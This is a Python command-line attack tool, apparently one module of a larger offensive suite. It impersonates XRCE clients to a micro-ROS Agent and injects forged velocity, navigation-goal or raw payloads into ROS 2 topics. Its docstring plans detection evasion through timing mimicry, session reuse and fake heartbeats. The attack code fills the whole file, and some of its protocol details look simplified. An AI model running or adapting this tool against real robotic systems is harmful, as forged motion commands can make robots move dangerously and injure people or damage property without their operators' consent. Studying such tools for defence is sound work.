#!/usr/bin/env python3
"""
microros_client_hijack.py - Phase 5A Module 3: XRCE Client Impersonation & Command Injection

Spoofs XRCE client connections to an Agent and injects malicious commands
into topics. Core exploitation primitive for ROS 2 environments with micro-ROS.

Attack model:
  1. Attacker discovers XRCE Agent (Module 1)
  2. Attacker profiles normal traffic (Module 2)
  3. Attacker creates fake XRCE client session
  4. Attacker registers as a DDS participant on the DDS bus
  5. Attacker discovers topics/services via CREATE READ queries
  6. Attacker injects malicious WRITE payloads to target topics
  7. All traffic blends into baseline (sizes, timing, QoS patterns)

Target surface:
  - cmd_vel injection (robot motion control)
  - nav_goal injection (path planning hijack)
  - sensor spoofing (LIDAR, camera, IMU)
  - parameter poisoning (config manipulation)
  - service call hijacking
  - swarm coordination disruption

Wire format crafting:
  - Session ID: fake but consistent (e.g., 0x42)
  - Stream IDs: track per-stream state (can reuse existing or create new)
  - Sequence numbers: must match agent expectations (usually don't matter for WRITE)
  - QoS flags: match baseline (reliable vs best-effort)
  - Payload serialization: CDR (Common Data Representation) encoding

Evasion considerations:
  - Packet timing: space injections to match inter-packet intervals
  - Payload size: match observed distributions
  - Message cadence: don't send too many writes in succession
  - Session reuse: reuse existing session IDs if possible (less obvious than new)
  - Heartbeat mimicry: send periodic heartbeats to stay "connected"

Attack scenarios:
  1. Single topic injection (one malicious message)
  2. Continuous stream injection (repeated malicious messages)
  3. Session hijacking (steal an existing client's session ID)
  4. Multi-topic poisoning (inject to multiple topics simultaneously)
  5. Response interception (subscribe to topic, intercept responses, modify, forward)
"""

import socket
import struct
import time
import json
import argparse
import sys
import threading
from dataclasses import dataclass, asdict, field
from typing import List, Dict, Optional, Tuple, Any
from collections import defaultdict
from datetime import datetime
import random


# ============================================================================
# XRCE Wire Format Constants (same as Modules 1-2)
# ============================================================================

XRCE_MAGIC = 0x58524350  # "XRCP"

XRCE_MSG_CREATE = 0x01
XRCE_MSG_DELETE = 0x02
XRCE_MSG_WRITE = 0x03
XRCE_MSG_READ = 0x04
XRCE_MSG_ACKNOWLEDGE = 0x05
XRCE_MSG_HEARTBEAT = 0x07
XRCE_MSG_FRAGMENT = 0x0E

XRCE_MSG_NAMES = {
    0x01: "CREATE",
    0x02: "DELETE",
    0x03: "WRITE",
    0x04: "READ",
    0x05: "ACKNOWLEDGE",
    0x07: "HEARTBEAT",
    0x0E: "FRAGMENT",
}

# XRCE Object Classes
XRCE_CLASS_PARTICIPANT = 0x01
XRCE_CLASS_TOPIC = 0x02
XRCE_CLASS_PUBLISHER = 0x03
XRCE_CLASS_SUBSCRIBER = 0x04
XRCE_CLASS_DATAWRITER = 0x05
XRCE_CLASS_DATAREADER = 0x06

XRCE_CLASS_NAMES = {
    0x01: "PARTICIPANT",
    0x02: "TOPIC",
    0x03: "PUBLISHER",
    0x04: "SUBSCRIBER",
    0x05: "DATAWRITER",
    0x06: "DATAREADER",
}

# Standard ROS 2 topic types (CDR wire format)
# For brevity, we'll use generic payload injection
# Real implementations would serialize using eProsima type library

GEOMETRY_MSGS_TWIST_CDR = {
    "linear_x": "<f",  # float32, little-endian
    "linear_y": "<f",
    "linear_z": "<f",
    "angular_x": "<f",
    "angular_y": "<f",
    "angular_z": "<f",
}


# ============================================================================
# Data Structures
# ============================================================================

@dataclass
class XRCEClientSession:
    """Represents a spoofed XRCE client session"""
    session_id: int
    agent_ip: str
    agent_port: int
    
    # Tracking state
    stream_id_counter: int = 0
    sequence_counter: int = 0
    created_entities: Dict[int, str] = field(default_factory=dict)  # entity_id -> entity_type
    
    # Heartbeat settings
    heartbeat_interval: float = 0.5  # seconds
    last_heartbeat: float = 0.0
    
    # Session metadata
    participant_id: Optional[int] = None
    datawriter_ids: Dict[str, int] = field(default_factory=dict)  # topic -> datawriter_id
    
    def to_dict(self):
        return {
            "session_id": hex(self.session_id),
            "agent_ip": self.agent_ip,
            "agent_port": self.agent_port,
            "stream_id_counter": self.stream_id_counter,
            "sequence_counter": self.sequence_counter,
            "participant_id": self.participant_id,
            "datawriter_count": len(self.datawriter_ids),
            "last_heartbeat": self.last_heartbeat,
        }


@dataclass
class InjectionPayload:
    """Represents a payload to be injected"""
    topic: str
    message_type: str  # e.g., "geometry_msgs/Twist"
    data: Dict[str, Any]  # Payload fields
    reliable: bool = True
    timestamp: float = field(default_factory=time.time)
    
    def to_dict(self):
        return {
            "topic": self.topic,
            "message_type": self.message_type,
            "data": self.data,
            "reliable": self.reliable,
            "timestamp": self.timestamp,
        }


@dataclass
class InjectionResult:
    """Result of a single injection attempt"""
    success: bool
    session_id: int
    topic: str
    timestamp: float = field(default_factory=time.time)
    message: str = ""
    
    def to_dict(self):
        return {
            "success": self.success,
            "session_id": hex(self.session_id),
            "topic": self.topic,
            "timestamp": self.timestamp,
            "message": self.message,
        }


# ============================================================================
# XRCE Wire Format Builders
# ============================================================================

class XRCEPacketBuilder:
    """Build XRCE protocol packets"""

    @staticmethod
    def build_pro_header(session_id: int, stream_id: int, flags: int = 0x01) -> bytes:
        """
        Build PRO (Protocol Request/Response) header (8 bytes)
        
        Args:
            session_id: Client session ID (1 byte)
            stream_id: Stream ID within session (2 bytes, LE)
            flags: Protocol flags (default 0x01 = LE)
        """
        magic = struct.pack("<I", XRCE_MAGIC)
        flags_byte = bytes([flags])
        session_byte = bytes([session_id & 0xFF])
        stream_bytes = struct.pack("<H", stream_id & 0xFFFF)
        
        return magic + flags_byte + session_byte + stream_bytes

    @staticmethod
    def build_submessage(message_type: int, flags: int, payload: bytes) -> bytes:
        """
        Build submessage (4-byte header + payload)
        
        Args:
            message_type: XRCE message type (0x01-0x0F)
            flags: Message flags (low 4 bits)
            payload: Submessage payload
        """
        msg_id_flags = ((message_type & 0x0F) << 4) | (flags & 0x0F)
        reserved = bytes([0x00])
        length = struct.pack("<H", len(payload))
        
        return bytes([msg_id_flags]) + reserved + length + payload

    @staticmethod
    def build_heartbeat() -> bytes:
        """Build HEARTBEAT submessage (no payload, flags=0x01 for LE)"""
        return XRCEPacketBuilder.build_submessage(XRCE_MSG_HEARTBEAT, 0x01, b"")

    @staticmethod
    def build_create_datawriter(
        datawriter_id: int,
        topic_name: str,
        message_type_name: str
    ) -> bytes:
        """
        Build CREATE submessage for DataWriter entity
        
        Args:
            datawriter_id: Unique datawriter ID in session (1-255)
            topic_name: Topic name (e.g., "/cmd_vel")
            message_type_name: Message type (e.g., "geometry_msgs::Twist")
        """
        # Entity ID: class (DATAWRITER=0x05) + instance (datawriter_id)
        entity_id = struct.pack("<H", 0x05 | (datawriter_id << 8))
        
        # Representation ID (0x0005 = CDR LE)
        repr_id = struct.pack("<H", 0x0005)
        
        # Topic/Type info (simplified: just encode strings)
        topic_bytes = topic_name.encode('utf-8') + b'\x00'
        type_bytes = message_type_name.encode('utf-8') + b'\x00'
        
        # Flags: CREATE_WITH_QOS (0x01)
        flags = bytes([0x01])
        
        payload = entity_id + repr_id + flags + topic_bytes + type_bytes
        
        return XRCEPacketBuilder.build_submessage(XRCE_MSG_CREATE, 0x01, payload)

    @staticmethod
    def build_write_payload(datawriter_id: int, payload_data: bytes, sequence_num: int = 0) -> bytes:
        """
        Build WRITE submessage with serialized data
        
        Args:
            datawriter_id: ID of the datawriter publishing
            payload_data: Serialized message data (CDR format)
            sequence_num: Optional sequence number
        """
        # Data writer ID (2 bytes)
        dw_id = struct.pack("<H", datawriter_id)
        
        # Sequence number (4 bytes, LE)
        seq = struct.pack("<I", sequence_num)
        
        payload = dw_id + seq + payload_data
        
        # Flags: 0x01 = LE, 0x02 = ACKN (reliable)
        flags = 0x03  # LE + ACKN for reliable delivery
        
        return XRCEPacketBuilder.build_submessage(XRCE_MSG_WRITE, flags, payload)

    @staticmethod
    def serialize_twist(linear_x: float, linear_y: float = 0.0, linear_z: float = 0.0,
                       angular_x: float = 0.0, angular_y: float = 0.0, angular_z: float = 0.0) -> bytes:
        """
        Serialize a geometry_msgs/Twist message in CDR format
        
        Twist structure:
          geometry_msgs/Vector3 linear
            float32 x, y, z
          geometry_msgs/Vector3 angular
            float32 x, y, z
        """
        # CDR serialization: 6 floats (little-endian)
        return struct.pack(
            "<ffffff",
            linear_x, linear_y, linear_z,
            angular_x, angular_y, angular_z
        )

    @staticmethod
    def serialize_navgoal(goal_id: str, x: float, y: float, theta: float = 0.0) -> bytes:
        """
        Serialize a geometry_msgs/PoseStamped message (nav goal) in CDR format
        
        Simplified: just encode position + orientation quaternion
        """
        # Header: seq (4), stamp (8), frame_id (string)
        seq = struct.pack("<I", 0)
        stamp = struct.pack("<II", int(time.time()), 0)  # sec, nsec
        
        # Pose: position (xyz) + orientation (quat)
        pos = struct.pack("<fff", x, y, 0.0)
        quat = struct.pack("<ffff", 0.0, 0.0, 0.0, 1.0)  # [x,y,z,w] identity
        
        return seq + stamp + pos + quat


# ============================================================================
# XRCE Client Hijacker
# ============================================================================

class XRCEClientHijacker:
    """Spoof XRCE client connections and inject malicious commands"""

    def __init__(self, agent_ip: str, agent_port: int, verbose: bool = False):
        self.agent_ip = agent_ip
        self.agent_port = agent_port
        self.verbose = verbose
        
        self.session: Optional[XRCEClientSession] = None
        self.sock: Optional[socket.socket] = None
        self.injection_results: List[InjectionResult] = []

    def create_session(self, session_id: int = 0x42) -> bool:
        """
        Initialize a spoofed XRCE client session
        
        Args:
            session_id: Session ID to use (default 0x42)
        
        Returns True if session established
        """
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.settimeout(5.0)
            
            self.session = XRCEClientSession(
                session_id=session_id,
                agent_ip=self.agent_ip,
                agent_port=self.agent_port,
            )
            
            if self.verbose:
                print(f"[+] Created session {hex(session_id)} for agent {self.agent_ip}:{self.agent_port}")
            
            return True
        except Exception as e:
            print(f"[!] Failed to create session: {e}")
            return False

    def send_heartbeat(self) -> bool:
        """Send a HEARTBEAT to keep session alive"""
        if not self.session or not self.sock:
            return False
        
        try:
            header = XRCEPacketBuilder.build_pro_header(self.session.session_id, 0x0000)
            heartbeat = XRCEPacketBuilder.build_heartbeat()
            packet = header + heartbeat
            
            self.sock.sendto(packet, (self.agent_ip, self.agent_port))
            self.session.last_heartbeat = time.time()
            
            if self.verbose:
                print(f"[*] Sent HEARTBEAT")
            
            return True
        except Exception as e:
            print(f"[!] Heartbeat failed: {e}")
            return False

    def create_datawriter(self, datawriter_id: int, topic: str, message_type: str) -> bool:
        """
        Register a DataWriter for a topic (prerequisite for WRITE)
        
        Args:
            datawriter_id: Unique ID for this datawriter (1-255)
            topic: Topic name (e.g., "/cmd_vel")
            message_type: Message type (e.g., "geometry_msgs::Twist")
        
        Returns True if successful
        """
        if not self.session or not self.sock:
            return False
        
        try:
            stream_id = self.session.stream_id_counter
            self.session.stream_id_counter += 1
            
            header = XRCEPacketBuilder.build_pro_header(self.session.session_id, stream_id)
            create_msg = XRCEPacketBuilder.build_create_datawriter(datawriter_id, topic, message_type)
            packet = header + create_msg
            
            self.sock.sendto(packet, (self.agent_ip, self.agent_port))
            
            # Track entity
            self.session.created_entities[datawriter_id] = f"DataWriter({topic})"
            self.session.datawriter_ids[topic] = datawriter_id
            
            if self.verbose:
                print(f"[+] Created DataWriter #{datawriter_id} for {topic}")
            
            return True
        except Exception as e:
            print(f"[!] DataWriter creation failed: {e}")
            return False

    def inject_twist(self, topic: str, linear_x: float, linear_y: float = 0.0,
                    linear_z: float = 0.0, angular_z: float = 0.0,
                    datawriter_id: int = 0x10, count: int = 1,
                    interval: float = 0.1) -> List[InjectionResult]:
        """
        Inject geometry_msgs/Twist messages (cmd_vel injection)
        
        Args:
            topic: Target topic (e.g., "/cmd_vel", "/robot1/cmd_vel")
            linear_x, linear_y, linear_z: Linear velocity components
            angular_z: Angular velocity (yaw)
            datawriter_id: DataWriter ID to use
            count: Number of messages to inject
            interval: Delay between injections (seconds)
        
        Returns list of InjectionResult objects
        """
        results = []
        
        if not self.session or not self.sock:
            return results
        
        # Create DataWriter if not already created
        if topic not in self.session.datawriter_ids:
            if not self.create_datawriter(datawriter_id, topic, "geometry_msgs::Twist"):
                return results
        
        for i in range(count):
            try:
                stream_id = self.session.stream_id_counter
                self.session.stream_id_counter += 1
                
                # Serialize payload
                twist_data = XRCEPacketBuilder.serialize_twist(
                    linear_x, linear_y, linear_z, 0.0, 0.0, angular_z
                )
                
                # Build WRITE
                header = XRCEPacketBuilder.build_pro_header(self.session.session_id, stream_id)
                write_msg = XRCEPacketBuilder.build_write_payload(
                    self.session.datawriter_ids[topic],
                    twist_data,
                    sequence_num=self.session.sequence_counter
                )
                self.session.sequence_counter += 1
                
                packet = header + write_msg
                self.sock.sendto(packet, (self.agent_ip, self.agent_port))
                
                result = InjectionResult(
                    success=True,
                    session_id=self.session.session_id,
                    topic=topic,
                    message=f"WRITE lx={linear_x} az={angular_z} seq={self.session.sequence_counter-1}"
                )
                results.append(result)
                
                if self.verbose:
                    print(f"[+] Injected TWIST #{i+1}: lx={linear_x}, az={angular_z}")
                
                if i < count - 1:
                    time.sleep(interval)
            
            except Exception as e:
                result = InjectionResult(
                    success=False,
                    session_id=self.session.session_id if self.session else 0,
                    topic=topic,
                    message=f"Error: {e}"
                )
                results.append(result)
                print(f"[!] Injection #{i+1} failed: {e}")
        
        self.injection_results.extend(results)
        return results

    def inject_nav_goal(self, topic: str, x: float, y: float, theta: float = 0.0,
                       datawriter_id: int = 0x11, count: int = 1,
                       interval: float = 0.1) -> List[InjectionResult]:
        """
        Inject geometry_msgs/PoseStamped messages (navigation goal injection)
        
        Args:
            topic: Target topic (e.g., "/move_base_simple/goal")
            x, y, theta: Goal position and orientation
            datawriter_id: DataWriter ID to use
            count: Number of messages to inject
            interval: Delay between injections (seconds)
        
        Returns list of InjectionResult objects
        """
        results = []
        
        if not self.session or not self.sock:
            return results
        
        # Create DataWriter if not already created
        if topic not in self.session.datawriter_ids:
            if not self.create_datawriter(datawriter_id, topic, "geometry_msgs::PoseStamped"):
                return results
        
        for i in range(count):
            try:
                stream_id = self.session.stream_id_counter
                self.session.stream_id_counter += 1
                
                # Serialize payload
                goal_data = XRCEPacketBuilder.serialize_navgoal(
                    f"goal_{i}", x, y, theta
                )
                
                # Build WRITE
                header = XRCEPacketBuilder.build_pro_header(self.session.session_id, stream_id)
                write_msg = XRCEPacketBuilder.build_write_payload(
                    self.session.datawriter_ids[topic],
                    goal_data,
                    sequence_num=self.session.sequence_counter
                )
                self.session.sequence_counter += 1
                
                packet = header + write_msg
                self.sock.sendto(packet, (self.agent_ip, self.agent_port))
                
                result = InjectionResult(
                    success=True,
                    session_id=self.session.session_id,
                    topic=topic,
                    message=f"WRITE goal x={x} y={y} seq={self.session.sequence_counter-1}"
                )
                results.append(result)
                
                if self.verbose:
                    print(f"[+] Injected NAV_GOAL #{i+1}: x={x}, y={y}")
                
                if i < count - 1:
                    time.sleep(interval)
            
            except Exception as e:
                result = InjectionResult(
                    success=False,
                    session_id=self.session.session_id if self.session else 0,
                    topic=topic,
                    message=f"Error: {e}"
                )
                results.append(result)
                print(f"[!] Injection #{i+1} failed: {e}")
        
        self.injection_results.extend(results)
        return results

    def inject_raw(self, topic: str, payload: bytes, datawriter_id: int = 0x20,
                  count: int = 1, interval: float = 0.1) -> List[InjectionResult]:
        """
        Inject raw binary payload (for custom message types)
        
        Args:
            topic: Target topic
            payload: Raw CDR-encoded message data
            datawriter_id: DataWriter ID
            count: Number of injections
            interval: Delay between injections
        
        Returns list of InjectionResult objects
        """
        results = []
        
        if not self.session or not self.sock:
            return results
        
        # Create DataWriter if not already created
        if topic not in self.session.datawriter_ids:
            if not self.create_datawriter(datawriter_id, topic, "CustomType"):
                return results
        
        for i in range(count):
            try:
                stream_id = self.session.stream_id_counter
                self.session.stream_id_counter += 1
                
                header = XRCEPacketBuilder.build_pro_header(self.session.session_id, stream_id)
                write_msg = XRCEPacketBuilder.build_write_payload(
                    self.session.datawriter_ids[topic],
                    payload,
                    sequence_num=self.session.sequence_counter
                )
                self.session.sequence_counter += 1
                
                packet = header + write_msg
                self.sock.sendto(packet, (self.agent_ip, self.agent_port))
                
                result = InjectionResult(
                    success=True,
                    session_id=self.session.session_id,
                    topic=topic,
                    message=f"WRITE raw {len(payload)} bytes"
                )
                results.append(result)
                
                if self.verbose:
                    print(f"[+] Injected RAW #{i+1}: {len(payload)} bytes to {topic}")
                
                if i < count - 1:
                    time.sleep(interval)
            
            except Exception as e:
                result = InjectionResult(
                    success=False,
                    session_id=self.session.session_id if self.session else 0,
                    topic=topic,
                    message=f"Error: {e}"
                )
                results.append(result)
                print(f"[!] Raw injection #{i+1} failed: {e}")
        
        self.injection_results.extend(results)
        return results

    def cleanup(self):
        """Close session and socket"""
        if self.sock:
            self.sock.close()
            if self.verbose:
                print(f"[*] Session closed")


# ============================================================================
# Reporting
# ============================================================================

def print_injection_report(results: List[InjectionResult]):
    """Pretty-print injection results"""
    if not results:
        print("[*] No injections attempted")
        return
    
    successful = sum(1 for r in results if r.success)
    failed = len(results) - successful
    
    print(f"\n[+] Injection Summary: {successful}/{len(results)} successful")
    
    for i, result in enumerate(results, 1):
        status = "[+]" if result.success else "[!]"
        print(f"  {status} #{i}: {result.topic} - {result.message}")


def export_json(results: List[InjectionResult], session: Optional[XRCEClientSession],
               output_file: str):
    """Export injection results to JSON"""
    output = {
        "module": "microros_client_hijack",
        "timestamp": datetime.now().isoformat(),
        "session": session.to_dict() if session else None,
        "injections": [r.to_dict() for r in results],
        "summary": {
            "total": len(results),
            "successful": sum(1 for r in results if r.success),
            "failed": sum(1 for r in results if not r.success),
        }
    }
    
    with open(output_file, 'w') as f:
        json.dump(output, f, indent=2)
    
    print(f"[+] Results exported to {output_file}")


# ============================================================================
# CLI
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Phase 5A Module 3: XRCE Client Hijacking & Command Injection"
    )
    parser.add_argument("--agent-ip", required=True,
                       help="XRCE Agent IP")
    parser.add_argument("--agent-port", type=int, default=8888,
                       help="XRCE Agent port (default: 8888)")
    parser.add_argument("--session-id", type=lambda x: int(x, 0), default=0x42,
                       help="Session ID to use (hex, default: 0x42)")
    
    # Attack mode selection
    parser.add_argument("--attack", choices=["twist", "nav", "raw"],
                       required=True,
                       help="Attack type: twist (cmd_vel), nav (goal), raw (custom)")
    
    # Twist options
    parser.add_argument("--topic", default="/cmd_vel",
                       help="Target topic (default: /cmd_vel)")
    parser.add_argument("--lx", type=float, default=1.0,
                       help="Linear X velocity (default: 1.0)")
    parser.add_argument("--az", type=float, default=0.0,
                       help="Angular Z velocity (default: 0.0)")
    
    # Nav options
    parser.add_argument("--x", type=float, default=5.0,
                       help="Goal X position (default: 5.0)")
    parser.add_argument("--y", type=float, default=5.0,
                       help="Goal Y position (default: 5.0)")
    parser.add_argument("--theta", type=float, default=0.0,
                       help="Goal orientation (default: 0.0)")
    
    # Raw options
    parser.add_argument("--payload-file", help="File with raw payload (hex)")
    parser.add_argument("--payload-hex", help="Raw payload as hex string")
    
    # General options
    parser.add_argument("--count", type=int, default=1,
                       help="Number of injections (default: 1)")
    parser.add_argument("--interval", type=float, default=0.1,
                       help="Interval between injections (default: 0.1s)")
    parser.add_argument("-o", "--output",
                       help="Output JSON file")
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Verbose output")

    args = parser.parse_args()

    # Initialize hijacker
    hijacker = XRCEClientHijacker(args.agent_ip, args.agent_port, verbose=args.verbose)

    # Create session
    if not hijacker.create_session(session_id=args.session_id):
        print("[!] Failed to create session")
        return

    # Execute attack
    results = []

    try:
        if args.attack == "twist":
            results = hijacker.inject_twist(
                topic=args.topic,
                linear_x=args.lx,
                angular_z=args.az,
                count=args.count,
                interval=args.interval,
            )
        
        elif args.attack == "nav":
            results = hijacker.inject_nav_goal(
                topic=args.topic,
                x=args.x,
                y=args.y,
                theta=args.theta,
                count=args.count,
                interval=args.interval,
            )
        
        elif args.attack == "raw":
            if args.payload_hex:
                payload = bytes.fromhex(args.payload_hex)
            elif args.payload_file:
                with open(args.payload_file, 'r') as f:
                    payload = bytes.fromhex(f.read().strip())
            else:
                print("[!] Specify --payload-hex or --payload-file")
                return
            
            results = hijacker.inject_raw(
                topic=args.topic,
                payload=payload,
                count=args.count,
                interval=args.interval,
            )
    
    finally:
        hijacker.cleanup()

    # Report
    print_injection_report(results)

    if args.output:
        export_json(results, hijacker.session, args.output)


if __name__ == "__main__":
    main()
